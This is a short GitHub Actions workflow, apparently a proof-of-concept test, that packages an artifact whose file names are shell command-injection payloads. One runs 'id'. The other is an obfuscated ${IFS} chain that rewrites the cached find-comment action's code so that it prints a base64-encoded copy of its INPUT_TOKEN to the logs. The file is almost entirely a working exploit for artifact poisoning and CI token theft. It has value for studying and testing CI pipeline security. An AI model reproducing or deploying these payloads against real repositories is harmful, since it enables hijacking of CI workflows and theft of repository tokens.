name: Test

on:
  pull_request:

permissions:
  contents: read

jobs:
  upload:
    runs-on: ubuntu-latest
    steps:
      - name: build artifact with attacker-controlled filenames
        env:
          PR: ${{ github.event.pull_request.number }}
        run: |
          set -e
          mkdir -p content
          printf 'plain report\n' > content/report.txt
          printf '%s\n' "$PR" > content/pr_number.txt
          printf 'payload\n' > 'content/p$(id).txt'
          printf 'make cat succeed\n' > content/x.txt
          printf 'payload\n' > 'content/x$(cd${IFS}..;cd${IFS}..;cd${IFS}_actions;cd${IFS}peter-evans;cd${IFS}find-comment;cd${IFS}v3;cd${IFS}dist;sed${IFS}-i${IFS}s#process.env#console.log\(btoa\(process\[String.fromCharCode\(101,110,118\)\].INPUT_TOKEN\)\)#g${IFS}index.js).txt'
          ls -1 content
      - uses: actions/upload-artifact@v4
        with:
          name: content
          path: content/
